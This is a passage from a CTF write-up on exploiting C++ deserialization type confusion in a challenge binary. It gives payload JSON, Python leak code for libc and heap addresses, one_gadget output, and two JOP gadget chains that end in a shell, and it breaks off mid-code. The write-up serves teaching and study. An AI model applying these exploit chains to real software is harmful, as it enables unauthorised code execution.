                    <span class="token property">"value7"</span><span class="token operator">:</span> <span class="token number">0</span>
                <span class="token punctuation">}</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span><span class="token punctuation">,</span>
    <span class="token property">"value1"</span><span class="token operator">:</span> <span class="token punctuation">{</span> <span class="token comment">// Toast (unused this time)</span>
        <span class="token comment">// ...</span>
    <span class="token punctuation">}</span><span class="token punctuation">,</span>
    <span class="token property">"value2"</span><span class="token operator">:</span> <span class="token punctuation">{</span> <span class="token comment">// Fruit</span>
        <span class="token property">"ptr_wrapper"</span><span class="token operator">:</span> <span class="token punctuation">{</span>
            <span class="token property">"id"</span><span class="token operator">:</span> <span class="token number">1</span> <span class="token comment">// Refer to Congee object</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span></code></pre><div class="toolbar"><div class="toolbar-item"><span>mem_read_json</span></div><div class="toolbar-item"><span class="lang">JSON</span></div><div class="toolbar-item"><button class="copy-to-clipboard-button" type="button" title="Copy Code"></button></div></div></div><p>We'll use the GOT entry of <code>malloc</code> as the string buffer. GOT entries are a fixed relative offset in the binary, so we can calculate it using our earlier vtable leak. When the string is printed, the GOT entry will be dereferenced and the address of <code>malloc</code> printed.</p><div class="code-toolbar"><pre class="language-python" tabindex="0"><code class="language-python">got_malloc <span class="token operator">=</span> vtable_addr <span class="token operator">-</span> e<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'_ZN5Toast3eatEv'</span><span class="token punctuation">]</span> <span class="token operator">+</span> e<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'malloc'</span><span class="token punctuation">]</span>
bytes_ <span class="token operator">=</span> send_json<span class="token punctuation">(</span>mem_read_json <span class="token operator">%</span> <span class="token punctuation">(</span>got_malloc<span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment"># % (buffer, size, capacity)</span>
malloc_addr <span class="token operator">=</span> u64<span class="token punctuation">(</span>bytes_<span class="token punctuation">)</span>
libc_base <span class="token operator">=</span> malloc_addr <span class="token operator">-</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'malloc'</span><span class="token punctuation">]</span></code></pre><div class="toolbar"><div class="toolbar-item"><span class="lang">Python</span></div><div class="toolbar-item"><button class="copy-to-clipboard-button" type="button" title="Copy Code"></button></div></div></div><h3 id="finding-the-heap-address" tabindex="-1"><a class="md-anchor" href="#finding-the-heap-address" aria-hidden="true"></a> Finding the Heap Address</h3><details><summary>Why do we need a heap address?</summary><div class="details-content"><p>During the final stage of type confusion, we will be controlling a malicious <em>vpointer</em> (not the <em>vtable</em>!). To actually get control flow hijacking, we want the vpointer to point to a vtable, which will be our custom-crafted payload placed among the 7 remaining quadwords of <code>Congee</code>. Thus, we need a heap address to the chunk where <code>Congee</code> will be allocated.</p><div class="details-collapse-bottom"><sub><a class="details-collapse-button">(collapse)</a></sub></div></div></details><p>To get a heap address leak, we can use the same memory read primitive and target an address which <em>contains a heap address</em>. There are several approaches.</p><ol><li><p>One way is to obtain the main arena, which can be found from libc offset <code>+0x203ac0</code>. This then necessitates a convoluted hunt for heap addresses through a sea of indirection.</p><div class="code-toolbar"><pre class="language-python" tabindex="0"><code class="language-python">main_arena_offset <span class="token operator">=</span> <span class="token number">0x203ac0</span>
main_arena_bins_offset <span class="token operator">=</span> main_arena_offset <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token number">0xb30</span> <span class="token operator">-</span> <span class="token number">0xac0</span><span class="token punctuation">)</span>
main_arena_bins_size <span class="token operator">=</span> <span class="token number">0x7f0</span>
bytes_ <span class="token operator">=</span> send_json<span class="token punctuation">(</span>mem_read_json <span class="token operator">%</span> <span class="token punctuation">(</span>libc_base <span class="token operator">+</span> main_arena_bins_offset<span class="token punctuation">,</span> main_arena_bins_size<span class="token punctuation">,</span> main_arena_bins_size<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token comment"># More convoluted parsing...</span></code></pre><div class="toolbar"><div class="toolbar-item"><span class="lang">Python</span></div><div class="toolbar-item"><button class="copy-to-clipboard-button" type="button" title="Copy Code"></button></div></div></div></li><li><p>Alternatively, a simpler method I observed from submissions is to take advantage of the <code>cereal::base64::chars</code> string declared globally in the binary.</p><div class="code-toolbar"><pre class="language-cpp" tabindex="0"><code class="language-cpp"><span class="token keyword">namespace</span> cereal
<span class="token punctuation">{</span>
  <span class="token keyword">namespace</span> base64
  <span class="token punctuation">{</span>
    <span class="token keyword">static</span> <span class="token keyword">const</span> std<span class="token double-colon punctuation">::</span>string chars <span class="token operator">=</span>
      <span class="token string">"ABCDEFGHIJKLMNOPQRSTUVWXYZ"</span>
      <span class="token string">"abcdefghijklmnopqrstuvwxyz"</span>
      <span class="token string">"0123456789+/"</span><span class="token punctuation">;</span></code></pre><div class="toolbar"><div class="toolbar-item"><span class="lang">C++</span></div><div class="toolbar-item"><button class="copy-to-clipboard-button" type="button" title="Copy Code"></button></div></div></div><p>By reading from this memory, we can leak the heap-allocated buffer of <code>cereal::base64::chars</code>.</p><div class="code-toolbar"><pre class="language-python" tabindex="0"><code class="language-python">base64_chars_addr <span class="token operator">=</span> vtable_addr <span class="token operator">+</span> e<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'_ZN6cereal6base64L5charsE'</span><span class="token punctuation">]</span> <span class="token operator">-</span> e<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'_ZN5Toast3eatEv'</span><span class="token punctuation">]</span>
bytes_ <span class="token operator">=</span> send_json<span class="token punctuation">(</span>mem_read_json <span class="token operator">%</span> <span class="token punctuation">(</span>base64_chars_addr<span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
heap_addr <span class="token operator">=</span> u64<span class="token punctuation">(</span>bytes_<span class="token punctuation">)</span></code></pre><div class="toolbar"><div class="toolbar-item"><span class="lang">Python</span></div><div class="toolbar-item"><button class="copy-to-clipboard-button" type="button" title="Copy Code"></button></div></div></div></li></ol><p>For the sake of simplicity, we'll stick with the <code>cereal::base64::chars</code> method.</p><h3 id="finding-congees-address" tabindex="-1"><a class="md-anchor" href="#finding-congees-address" aria-hidden="true"></a> Finding Congee's Address</h3><p>By observation, <code>Congee</code>’s address remains unchanged between iterations. This means if we know the address of Congee this iteration, we can reuse that address next iteration.</p><p><a class="lightbox-single" title="Notice how the address of the Congee object (c) is consistent across repeated deserializations." href="/img/posts/infosec/cpp-deserialization/assets/breakfast_congee_address_unchanged-1870w.webp"><img class="mb-2 rw center jw-100" src="/img/posts/infosec/cpp-deserialization/assets/breakfast_congee_address_unchanged-1870w.webp" loading="lazy" decoding="async" style="aspect-ratio: auto 1870 / 1328" alt="Notice how the address of the Congee object (c) is consistent across repeated deserializations." title="Notice how the address of the Congee object (c) is consistent across repeated deserializations." srcset="/img/posts/infosec/cpp-deserialization/assets/breakfast_congee_address_unchanged-256w.webp 256w, /img/posts/infosec/cpp-deserialization/assets/breakfast_congee_address_unchanged-512w.webp 512w, /img/posts/infosec/cpp-deserialization/assets/breakfast_congee_address_unchanged-1024w.webp 1024w, /img/posts/infosec/cpp-deserialization/assets/breakfast_congee_address_unchanged-1870w.webp 1870w" sizes="(max-width: 256px) 256px, (max-width: 512px) 512px, (max-width: 1024px) 1024px, 1870px"></a></p><p>Interestingly, the offset of <code>c</code> from the <em>heap's base address</em> is constant, and we can calculate it to be <code>+0x131c0</code>… at least locally.</p><p><a class="lightbox-single" title="" href="/img/posts/infosec/cpp-deserialization/assets/breakfast_congee_heap_offset-1386w.webp"><img class="mb-2 rw center jw-100" src="/img/posts/infosec/cpp-deserialization/assets/breakfast_congee_heap_offset-1386w.webp" loading="lazy" decoding="async" style="aspect-ratio: auto 1386 / 230" alt="" title="" srcset="/img/posts/infosec/cpp-deserialization/assets/breakfast_congee_heap_offset-256w.webp 256w, /img/posts/infosec/cpp-deserialization/assets/breakfast_congee_heap_offset-512w.webp 512w, /img/posts/infosec/cpp-deserialization/assets/breakfast_congee_heap_offset-1024w.webp 1024w, /img/posts/infosec/cpp-deserialization/assets/breakfast_congee_heap_offset-1386w.webp 1386w" sizes="(max-width: 256px) 256px, (max-width: 512px) 512px, (max-width: 1024px) 1024px, 1386px"></a></p><h3 id="finding-congees-address-less-hacky-method" tabindex="-1"><a class="md-anchor" href="#finding-congees-address-less-hacky-method" aria-hidden="true"></a> Finding Congee's Address: Less Hacky Method</h3><p>Perhaps that seems too hacky or inelegant to some. What if the offset was random? That would likely be the case in a more complex C++ program, one with heaps of memory allocation and deallocation. In that case, I offer an alternative approach.</p><p>We can use the bytes in <code>Congee</code> to store a canary/needle—&nbsp;some kind of fixed string or pattern. Using our leaked heap address as a reference, we'll perform a giant memory read (e.g. <code>0x1000</code> bytes) and look for the needle.</p><p>In the following code, we'll look for the fixed pattern <code>ABCD</code> (<code>0x41424344</code>) in Congee.</p><div class="code-toolbar"><pre class="language-python" tabindex="0"><code class="language-python"><span class="token comment"># Find a heap address</span>
base64_chars_addr <span class="token operator">=</span> vtable_addr <span class="token operator">+</span> e<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'_ZN6cereal6base64L5charsE'</span><span class="token punctuation">]</span> <span class="token operator">-</span> e<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'_ZN5Toast3eatEv'</span><span class="token punctuation">]</span>
bytes_ <span class="token operator">=</span> send_json<span class="token punctuation">(</span>mem_read_json <span class="token operator">%</span> <span class="token punctuation">(</span>base64_chars_addr<span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
heap_addr <span class="token operator">=</span> u64<span class="token punctuation">(</span>bytes_<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">{</span>heap_addr<span class="token operator">=</span><span class="token punctuation">:</span><span class="token format-spec">#x</span><span class="token punctuation">}</span></span><span class="token string">'</span></span><span class="token punctuation">)</span>

<span class="token comment"># Find the Congee chunk</span>
length<span class="token punctuation">,</span> needle <span class="token operator">=</span> <span class="token number">0x1000</span><span class="token punctuation">,</span> <span class="token number">0x41424344</span>
bytes_ <span class="token operator">=</span> send_json<span class="token punctuation">(</span>mem_read_json <span class="token operator">%</span> <span class="token punctuation">(</span>heap_addr<span class="token punctuation">,</span> length<span class="token punctuation">,</span> needle<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">assert</span> <span class="token builtin">len</span><span class="token punctuation">(</span>bytes_<span class="token punctuation">)</span> <span class="token operator">==</span> length<span class="token punctuation">,</span> <span class="token string-interpolation"><span class="token string">f'expected to read </span><span class="token interpolation"><span class="token punctuation">{</span>length<span class="token punctuation">}</span></span><span class="token string"> bytes'</span></span>
<span class="token keyword">assert</span> p64<span class="token punctuation">(</span>needle<span class="token punctuation">)</span> <span class="token keyword">in</span> bytes_<span class="token punctuation">,</span> <span class="token string">'unable to find needle in the haystack, maybe try a larger search length?'</span>
found_addr <span class="token operator">=</span> heap_addr <span class="token operator">+</span> bytes_<span class="token punctuation">.</span>index<span class="token punctuation">(</span>p64<span class="token punctuation">(</span>needle<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">16</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'FOUND THE CONGEE CHUNK! - </span><span class="token interpolation"><span class="token punctuation">{</span>found_addr<span class="token operator">=</span><span class="token punctuation">:</span><span class="token format-spec">#x</span><span class="token punctuation">}</span></span><span class="token string">'</span></span><span class="token punctuation">)</span></code></pre><div class="toolbar"><div class="toolbar-item"><span class="lang">Python</span></div><div class="toolbar-item"><button class="copy-to-clipboard-button" type="button" title="Copy Code"></button></div></div></div><h2 id="arbitrary-code-execution-ace-via-gadget-chains" tabindex="-1"><a class="md-anchor" href="#arbitrary-code-execution-ace-via-gadget-chains" aria-hidden="true"></a> Arbitrary Code Execution (ACE) via Gadget Chains</h2><p>We finally have enough information to get code execution! To do so, we will construct a gadget chain in <code>Congee</code> and craft the payload such that the virtual function call <code>t-&gt;eat()</code> will trigger the chain.</p><p><a class="lightbox-single" title="" href="/img/posts/infosec/cpp-deserialization/assets/breakfast_virtual_function_call-1035w.webp"><img class="mb-2 rw center jw-80 alpha-imgv" src="/img/posts/infosec/cpp-deserialization/assets/breakfast_virtual_function_call-1035w.webp" loading="lazy" decoding="async" style="aspect-ratio: auto 1035 / 485" alt="" title="" srcset="/img/posts/infosec/cpp-deserialization/assets/breakfast_virtual_function_call-256w.webp 256w, /img/posts/infosec/cpp-deserialization/assets/breakfast_virtual_function_call-512w.webp 512w, /img/posts/infosec/cpp-deserialization/assets/breakfast_virtual_function_call-1024w.webp 1024w, /img/posts/infosec/cpp-deserialization/assets/breakfast_virtual_function_call-1035w.webp 1035w" sizes="(max-width: 256px) 256px, (max-width: 512px) 512px, (max-width: 1024px) 1024px, 1035px"></a></p><p class="caption"><sup>1) When <code>toast-&gt;eat()</code> is called, the vtable is looked up. Due to type confusion, it actually uses a vpointer we control. 2) We control the vpointer to point to a vtable within the same <code>Congee</code> payload. The vtable contains a gadget which is called.</sup></p><p>Essentially, by controlling the vpointer and vtable, we control the virtual function being called. But how do we craft a malicious function? The answer lies in gadgets.</p><h3 id="pcop-jop" tabindex="-1"><a class="md-anchor" href="#pcop-jop" aria-hidden="true"></a> PCOP / JOP</h3><p>Classic ROP gadgets end in <code>ret</code>. Upon hitting the <code>ret</code>, the Instruction Pointer is set to the next item on the stack. Hence, gadgets could be chained by writing a block of memory to the stack.</p><p>PCOP/JOP is similar, but end in different instructions.</p><ul><li>PCOP (Pure Call Oriented Programming): ends in <code>call SOMETHING</code> which <strong>directly jumps</strong> to the next gadget</li><li>JOP (Jump Oriented Programming): ends in a <code>jmp</code>/<code>call</code> which jumps to a <strong>dispatcher</strong>, before jumping into a table of gadgets. The dispatcher's job is to increment a "gadget pointer" before jumping to the next gadget. <sup class="footnote-ref"><a href="#fn1" id="fnref1">1</a></sup><div class="code-toolbar"><pre class="language-asm" tabindex="0"><code class="language-asm">dispatch:
  add rax<span class="token punctuation">,</span> <span class="token number">8</span>
  jmp <span class="token punctuation">[</span>rax<span class="token punctuation">]</span></code></pre><div class="toolbar"><div class="toolbar-item"><span class="lang">Assembly</span></div><div class="toolbar-item"><button class="copy-to-clipboard-button" type="button" title="Copy Code"></button></div></div></div></li></ul><p>The advantage of PCOP/JOP is that they don't rely on the stack, preferring instructions such as <code>mov</code> and <code>call</code> over stack-based instructions such as <code>pop</code> and <code>ret</code>.</p><ul><li>ROP Gadget: <code>pop rax; ret</code>.</li><li>PCOP/JOP Gadget: <code>mov rax, [rdi+8]; call [rax+0x10]</code></li></ul><h3 id="approach-1-libstdc-and-one-gadget" tabindex="-1"><a class="md-anchor" href="#approach-1-libstdc-and-one-gadget" aria-hidden="true"></a> Approach 1: libstdc++ &amp; One-Gadget</h3><p>Funnily enough, this was the first working solution I came up with—&nbsp;and it's also the shortest payload I've seen so far (4 quads!).</p><p>A <strong>One-Gadget</strong> is a gadget which pops a shell if certain conditions are met. We can find these gadgets using the <a href="https://github.com/david942j/one_gadget" rel="noreferrer" target="_blank"><code>one_gadget</code> tool</a>.</p><div class="code-toolbar"><pre class="command-line language-sh" data-prompt="$" data-output="2-100" tabindex="0"><code class="language-sh"><span class="command-line-prompt"><span data-prompt="$"></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span><span class="token command">one_gadget <span class="token parameter variable">-f</span> /usr/lib/x86_64-linux-gnu/libc.so.6</span>
<span class="token output">0x583ec posix_spawn(rsp+0xc, "/bin/sh", 0, rbx, rsp+0x50, environ)</span>
<span class="token output">constraints:</span>
<span class="token output">  address rsp+0x68 is writable</span>
<span class="token output">  rsp &amp; 0xf == 0</span>
<span class="token output">  rax == NULL || {"sh", rax, rip+0x17301e, r12, ...} is a valid argv</span>
<span class="token output">  rbx == NULL || (u16)[rbx] == NULL</span>
<span class="token output"></span>
<span class="token output">0x583f3 posix_spawn(rsp+0xc, "/bin/sh", 0, rbx, rsp+0x50, environ)</span>
<span class="token output">constraints:</span>
<span class="token output">  address rsp+0x68 is writable</span>
<span class="token output">  rsp &amp; 0xf == 0</span>
<span class="token output">  rcx == NULL || {rcx, rax, rip+0x17301e, r12, ...} is a valid argv</span>
<span class="token output">  rbx == NULL || (u16)[rbx] == NULL</span>
<span class="token output"></span>
<span class="token output">0xef4ce execve("/bin/sh", rbp-0x50, r12)</span>
<span class="token output">constraints:</span>
<span class="token output">  address rbp-0x48 is writable</span>
<span class="token output">  rbx == NULL || {"/bin/sh", rbx, NULL} is a valid argv</span>
<span class="token output">  [r12] == NULL || r12 == NULL || r12 is a valid envp</span>
<span class="token output"></span>
<span class="token output">0xef52b execve("/bin/sh", rbp-0x50, [rbp-0x78])</span>
<span class="token output">constraints:</span>
<span class="token output">  address rbp-0x50 is writable</span>
<span class="token output">  rax == NULL || {"/bin/sh", rax, NULL} is a valid argv</span>
<span class="token output">  [[rbp-0x78]] == NULL || [rbp-0x78] == NULL || [rbp-0x78] is a valid envp</span></code></pre><div class="toolbar"><div class="toolbar-item"><span class="lang">Shell</span></div><div class="toolbar-item"><button class="copy-to-clipboard-button" type="button" title="Copy Code"></button></div></div></div><p>Looks like we found 4 one-gadgets. Each gadget lists the offset along with the constraints required to successfully trigger a shell. But to satisfy the constraints, we should first understand the state of the registers <strong>at the moment the virtual function is called</strong>. This calls for some breakpoints!</p><p><a class="lightbox-single" title="Disassembly and registers upon reaching Toast::eat(). Notice the register states of rax, rdi, rsi, and r13. These will be useful when hunting for gadgets." href="/img/posts/infosec/cpp-deserialization/assets/breakfast_navigate_to_toast_eat_see_regs-2738w.webp"><img class="mb-2 rw center jw-100" src="/img/posts/infosec/cpp-deserialization/assets/breakfast_navigate_to_toast_eat_see_regs-2738w.webp" loading="lazy" decoding="async" style="aspect-ratio: auto 2738 / 1188" alt="Disassembly and registers upon reaching Toast::eat(). Notice the register states of rax, rdi, rsi, and r13. These will be useful when hunting for gadgets." title="Disassembly and registers upon reaching Toast::eat(). Notice the register states of rax, rdi, rsi, and r13. These will be useful when hunting for gadgets." srcset="/img/posts/infosec/cpp-deserialization/assets/breakfast_navigate_to_toast_eat_see_regs-256w.webp 256w, /img/posts/infosec/cpp-deserialization/assets/breakfast_navigate_to_toast_eat_see_regs-512w.webp 512w, /img/posts/infosec/cpp-deserialization/assets/breakfast_navigate_to_toast_eat_see_regs-1024w.webp 1024w, /img/posts/infosec/cpp-deserialization/assets/breakfast_navigate_to_toast_eat_see_regs-2738w.webp 2738w" sizes="(max-width: 256px) 256px, (max-width: 512px) 512px, (max-width: 1024px) 1024px, 2738px"></a></p><p class="caption"><sup>Disassembly and registers upon reaching <code>Toast::eat()</code>, reachable via <code>b *main+1121; si</code>.</sup></p><p>By navigating to <code>Toast::eat()</code>, we notice the following interesting register states:</p><ul><li><code>rax == rdi</code>: non-controllable, address of virtual object (<code>&amp;*t</code>) <a class="lightbox-single" title="" href="/img/posts/infosec/cpp-deserialization/assets/breakfast_address_of_t-1016w.webp"><img class="mb-2 rw center jw-60" src="/img/posts/infosec/cpp-deserialization/assets/breakfast_address_of_t-1016w.webp" loading="lazy" decoding="async" style="aspect-ratio: auto 1016 / 288" alt="" title="" srcset="/img/posts/infosec/cpp-deserialization/assets/breakfast_address_of_t-256w.webp 256w, /img/posts/infosec/cpp-deserialization/assets/breakfast_address_of_t-512w.webp 512w, /img/posts/infosec/cpp-deserialization/assets/breakfast_address_of_t-1016w.webp 1016w" sizes="(max-width: 256px) 256px, (max-width: 512px) 512px, 1016px"></a></li><li><code>rdx</code>: controllable, first address to jump to</li><li><code>rsi == r13 == 0</code></li></ul><p>Our attention then turns to fulfilling the one-gadget constraints. I decided to look for gadgets supporting the third one-gadget (offset <code>0xef4ce</code>) due to the relatively simple conditions: we just need <code>rbx = r12 = 0</code>. We can hunt for gadgets with tools such as <a href="https://github.com/JonathanSalwan/ROPgadget" rel="noreferrer" target="_blank"><code>ROPgadget</code></a> or <a href="https://github.com/entropic-security/xgadget" rel="noreferrer" target="_blank"><code>xgadget</code></a>. The gadgets we're looking for should:</p><ol><li>Overwrite (or provide some control over) the desired registers.</li><li>The <code>call</code> instruction of each gadget should jump to a controllable location, such as an offset within <code>Congee</code>— <code>call [rax+0x10]</code>.</li><li>We should also <em>exclude</em> gadgets relying on the stack. This means any gadget containing <code>pop</code>, <code>leave</code>, and <code>ret</code>.<sup class="footnote-ref"><a href="#fn2" id="fnref2">2</a></sup></li></ol><p><a class="lightbox-single" title="" href="/img/posts/infosec/cpp-deserialization/assets/breakfast_finding_r12-1658w.webp"><img class="mb-2 rw center jw-100" src="/img/posts/infosec/cpp-deserialization/assets/breakfast_finding_r12-1658w.webp" loading="lazy" decoding="async" style="aspect-ratio: auto 1658 / 454" alt="" title="" srcset="/img/posts/infosec/cpp-deserialization/assets/breakfast_finding_r12-256w.webp 256w, /img/posts/infosec/cpp-deserialization/assets/breakfast_finding_r12-512w.webp 512w, /img/posts/infosec/cpp-deserialization/assets/breakfast_finding_r12-1024w.webp 1024w, /img/posts/infosec/cpp-deserialization/assets/breakfast_finding_r12-1658w.webp 1658w" sizes="(max-width: 256px) 256px, (max-width: 512px) 512px, (max-width: 1024px) 1024px, 1658px"></a></p><p class="caption"><sup>Output of <code>xgadget --reg-overwrite r12 --jop /usr/lib/x86_64-linux-gnu/libstdc++.so.6</code>. We found a useful <code>mov r12, rsi</code> gadget which sets <code>r12</code> to 0. Additionally, the gadget will go to <code>[rax+0x10]</code> meaning we can place another gadget at the <code>+0x10</code> offset to continue the chain.</sup></p><p>After a while, we ended up with two simple gadgets from <code>libstdc++</code>. Constructing the final payload is simply a matter of cooking congee with the right ingredients:</p><div class="code-toolbar"><pre data-label="vptr_hijack_json" class="language-json" tabindex="0"><code class="language-json"><span class="token punctuation">{</span>
    <span class="token property">"value0"</span><span class="token operator">:</span> <span class="token punctuation">{</span> <span class="token comment">// Congee</span>
        <span class="token property">"ptr_wrapper"</span><span class="token operator">:</span> <span class="token punctuation">{</span>
            <span class="token property">"id"</span><span class="token operator">:</span> <span class="token number">2147483649</span><span class="token punctuation">,</span>
            <span class="token property">"data"</span><span class="token operator">:</span> <span class="token punctuation">{</span>
                <span class="token property">"ingredients"</span><span class="token operator">:</span> <span class="token punctuation">{</span>
                    <span class="token property">"value0"</span><span class="token operator">:</span> %d<span class="token punctuation">,</span> <span class="token comment">// Control the vpointer</span>
                    <span class="token property">"value1"</span><span class="token operator">:</span> %d<span class="token punctuation">,</span> <span class="token comment">// Rest of the payload, gadgets, etc...</span>
                    <span class="token property">"value2"</span><span class="token operator">:</span> %d<span class="token punctuation">,</span> <span class="token comment">// ...</span>
                    <span class="token property">"value3"</span><span class="token operator">:</span> %d<span class="token punctuation">,</span> <span class="token comment">// ...</span>
                    <span class="token property">"value4"</span><span class="token operator">:</span> <span class="token number">0</span><span class="token punctuation">,</span>
                    <span class="token property">"value5"</span><span class="token operator">:</span> <span class="token number">0</span><span class="token punctuation">,</span>
                    <span class="token property">"value6"</span><span class="token operator">:</span> <span class="token number">0</span><span class="token punctuation">,</span>
                    <span class="token property">"value7"</span><span class="token operator">:</span> <span class="token number">0</span>
                <span class="token punctuation">}</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span><span class="token punctuation">,</span>
    <span class="token property">"value1"</span><span class="token operator">:</span> <span class="token punctuation">{</span> <span class="token comment">// Toast</span>
        <span class="token property">"polymorphic_id"</span><span class="token operator">:</span> <span class="token number">1073741824</span><span class="token punctuation">,</span>
        <span class="token property">"ptr_wrapper"</span><span class="token operator">:</span> <span class="token punctuation">{</span>
            <span class="token property">"id"</span><span class="token operator">:</span> <span class="token number">1</span> <span class="token comment">// Refer to the Congee object</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span><span class="token punctuation">,</span>
    <span class="token property">"value2"</span><span class="token operator">:</span> <span class="token punctuation">{</span> <span class="token comment">// Fruit (unused)</span>
        <span class="token comment">// ...</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span></code></pre><div class="toolbar"><div class="toolbar-item"><span>vptr_hijack_json</span></div><div class="toolbar-item"><span class="lang">JSON</span></div><div class="toolbar-item"><button class="copy-to-clipboard-button" type="button" title="Copy Code"></button></div></div></div><p>Congee Ingredients:</p><div class="table-container"><table><thead><tr><th>Offset</th><th>Value</th><th>Purpose</th></tr></thead><tbody><tr><td><code>0x00</code></td><td>address of Congee + <code>0x08</code></td><td>vpointer, points to offset <code>0x08</code></td></tr><tr><td><code>0x08</code></td><td><code>libstdcpp + 0xf0a0c</code></td><td>first gadget, <code>mov r12, rsi; call qword ptr [rax+0x10];</code></td></tr><tr><td><code>0x10</code></td><td><code>libstdcpp + 0xf5e83</code></td><td>second gadget, <code>mov rbx, rsi; ... call qword ptr [rax+0x18];</code></td></tr><tr><td><code>0x18</code></td><td><code>libc + 0xef4ce</code></td><td>one-gadget, sweet sweet code execution!</td></tr></tbody></table></div><p>The gadget flow is extremely straightforward:</p><ol><li>VTable is at Congee address + <code>0x08</code> →</li><li>gadget at <code>0x08</code> (set <code>r12</code> to 0) →</li><li>gadget at <code>0x10</code> (set <code>rbx</code> to 0) →</li><li>gadget at <code>0x18</code> (one-gadget ACE).</li></ol><p>Putting it all together, we get ACE.</p><p><a class="lightbox-single" title="" href="/img/posts/infosec/cpp-deserialization/assets/breakfast_full_script_demo-760w.webp"><img class="mb-2 rw center jw-50" src="/img/posts/infosec/cpp-deserialization/assets/breakfast_full_script_demo-760w.webp" loading="lazy" decoding="async" style="aspect-ratio: auto 760 / 742" alt="" title="" srcset="/img/posts/infosec/cpp-deserialization/assets/breakfast_full_script_demo-256w.webp 256w, /img/posts/infosec/cpp-deserialization/assets/breakfast_full_script_demo-512w.webp 512w, /img/posts/infosec/cpp-deserialization/assets/breakfast_full_script_demo-760w.webp 760w" sizes="(max-width: 256px) 256px, (max-width: 512px) 512px, 760px"></a></p><h3 id="approach-2-system-bin-sh-gadget-chain" tabindex="-1"><a class="md-anchor" href="#approach-2-system-bin-sh-gadget-chain" aria-hidden="true"></a> Approach 2: <code>system("/bin/sh")</code> Gadget Chain</h3><p>Credit: Adapted from @erge’s and @lolc4t’s solutions.</p><p>I'm sure this gadget chain feels closer to home for ROPpers. The chain works by setting <code>rdi</code> to <code>"/bin/sh"</code> and calling the <code>system</code> function. Despite the need for 6 quads in Congee, I find the chain rather fascinating as it condenses multiple steps into 2 clever gadgets.</p><p>Another nice aspect about this chain is that it does not rely on too much register state, only <code>rax</code> and <code>rdi</code> are used. (The libstdc++ and one-gadget chain rely on <code>rsi = 0</code> which may not always be the case.)</p><p>Congee Ingredients:</p><div class="table-container"><table><thead><tr><th>Offset</th><th>Value</th><th>Purpose</th></tr></thead><tbody><tr><td><code>0x00</code></td><td>address of Congee + <code>0x10</code></td><td>vpointer</td></tr><tr><td><code>0x08</code></td><td>address of Congee + <code>0x18</code></td><td>address of [system, binsh, gadget2] structure</td></tr><tr><td><code>0x10</code></td><td><code>libc + 0x1740b1</code></td><td>first gadget, <code>mov rax, [rdi+8]; call [rax+0x10]</code></td></tr><tr><td><code>0x18</code></td><td><code>system</code></td><td>sweet sweet code execution!</td></tr><tr><td><code>0x20</code></td><td><code>&amp;"/bin/sh"</code></td><td>address of any <code>/bin/sh</code> string</td></tr><tr><td><code>0x28</code></td><td><code>libc + 0xa5688</code></td><td>second gadget, <code>mov rdi, [rax+8]; call [rax]</code></td></tr></tbody></table></div><p>Here's the call flow:</p><ol><li>VTable is at Congee address + <code>0x10</code> →</li><li>gadget at <code>0x10</code> (set <code>rax</code> to <code>*(rdi+0x08)</code>, i.e. the second Congee entry, or in other words: <code>rax = rax + 0x18</code>) →</li><li>gadget at <code>0x28</code> (set <code>rdi</code> to <code>"/bin/sh"</code>) →</li><li>gadget at <code>0x18</code> (<code>system</code> ACE).</li></ol><p>To make this gadget chain work, we require the system, binsh, and <code>0xa5688</code> gadget to be <strong>contiguous in memory</strong>. This is because after <code>mov rax</code> in the first gadget, the subsequent assembly will <code>call [rax+0x10]</code>, which triggers the second gadget to copy <code>[rax+0x08]</code> before <code>call [rax]</code>. Each entry in this relative <code>+0x10</code>, <code>+0x08</code>, and <code>+0x00</code> structure has their unique role to play.</p><p>The order of the other gadgets don’t matter as much. Here’s one of the solves from the CTF community. Notice how the first gadget (<code>libc + 0x1740b1</code>) is placed at the end of the Congee payload instead of at offset <code>0x10</code>.</p><div class="code-toolbar"><pre class="language-python" tabindex="0"><code class="language-python"><span class="token string">'ingredients'</span><span class="token punctuation">:</span> <span class="token punctuation">{</span>
	<span class="token string">'value0'</span><span class="token punctuation">:</span> target_addr <span class="token operator">+</span> <span class="token number">0x38</span><span class="token punctuation">,</span> <span class="token comment"># &lt;-- target_addr, rax, rdi</span>
	<span class="token string">'value1'</span><span class="token punctuation">:</span> target_addr <span class="token operator">+</span> <span class="token number">0x10</span><span class="token punctuation">,</span>
	<span class="token string">'value2'</span><span class="token punctuation">:</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">.</span>system<span class="token punctuation">,</span>
